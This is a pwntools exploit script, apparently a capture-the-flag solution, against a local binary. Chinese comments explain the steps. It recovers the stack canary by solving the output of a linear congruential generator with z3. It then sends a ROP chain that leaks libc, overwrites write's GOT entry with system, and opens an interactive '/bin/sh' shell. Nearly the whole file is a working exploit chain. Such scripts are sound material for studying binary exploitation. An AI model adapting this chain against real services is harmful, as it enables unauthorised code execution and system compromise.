# encoding: utf-8
# /usr/bin/python2.7

from pwn import *
from z3 import *

context.arch = 'amd64'
libc = ELF("./libc.so.6")

r = process('./main')

r.recvuntil('sssh')

results = [0 for i in range(10)]
for i in range(10):
    results[i//5 + (i%5)*2] = int(r.recvline().strip())

# 用 z3 解出 canary
S = Solver()
cookie = canary = BitVec('canary', 64)

for i in range(10):
    canary = 25214903917 * canary + 11
    S.add( (canary>>16) & 0xFFFFFFFF  == results[i] )

assert( S.check() )

canary = S.model()[cookie].as_long() ^ 0x5DEECE66D
print hex(canary)

# ROP
# 先用 write leak libc_base, 再用 read 將 write_got 寫入 system, write_got+0x8 寫入 /bin/sh
# 最後呼叫 write(write+0x8) => system('/bin/sh')

pop_rdi = 0x400ab3
pop_rsi_r15 = 0x400ab1
pop_rdx = 0x4007cb

write_got = 0x601020
write_plt = 0x400660
read_plt = 0x400690


payload = 'a'*20 + p64(canary) + 'a'*0x2c
payload += flat(pop_rdi, 1, pop_rsi_r15, write_got, 0, pop_rdx, 0x50, write_plt, pop_rdi, 0, read_plt, pop_rdi, write_got+0x8, write_plt)

#gdb.attach(r, 'fin\nn 16')
r.sendlineafter('hello', payload)
libc_base = u64(r.recvuntil('\x7f')[-6:] + '\x00'*2) - libc.symbols['write']
print "libc_base @ ", hex(libc_base)
system = libc_base + libc.symbols['system']
print "system @ ", hex(system)

payload = flat(system, '/bin/sh')
r.sendline(payload)


r.interactive()